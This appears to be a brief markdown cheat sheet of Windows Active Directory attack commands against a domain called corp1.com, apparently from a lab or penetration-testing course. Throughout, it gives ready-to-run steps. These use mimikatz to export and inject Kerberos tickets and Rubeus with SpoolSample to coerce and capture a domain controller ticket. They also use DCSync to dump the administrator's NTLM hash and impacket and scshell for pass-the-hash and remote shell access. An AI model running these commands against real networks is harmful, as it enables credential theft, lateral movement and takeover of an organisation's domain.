run mimikatz with admin rights
```
privilege::debug
sekurlsa::tickets /export
sekurlsa::tickets /export


# load ticket, ticket must be  name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi

# exit mimikatz and execute psexec
C:\Tools\SysinternalsSuite\PsExec.exe -accepteula \\cdc01 cmd
```

## Get the krbtgt ticket  with rubeus and spoolsvss
```
Rubeus.exe monitor /interval:5 /filteruser:RDC01$
.\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com
Rubeus.exe ptt /ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+
```
## Obtain ntlm hash of the admin user either with dcsync, ntds.dit dump or mimikatz
```
privilege::debug
lsadump::dcsync /domain:corp1.com /user:corp1\administrator
```
## Request a TGT for that user with impacket-getTGT
```
impacket-getTGT corp1.com/administrator -hashes :NTLMHASH
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
```
## Use impacket-psexec 
```
impacket-psexec.py corp1.com/administrator@rdc01.corp1.com -k -no-pass
```

## Use scshell with hashes or ticket
```
python scshell.py DOMAIN/USER@target -hashes 00000000000000000000000000000000:ad9827fcd039eadde017568170abdecce
or 
python scshell.py DOMAIN/USER@target -k -no-pass
```
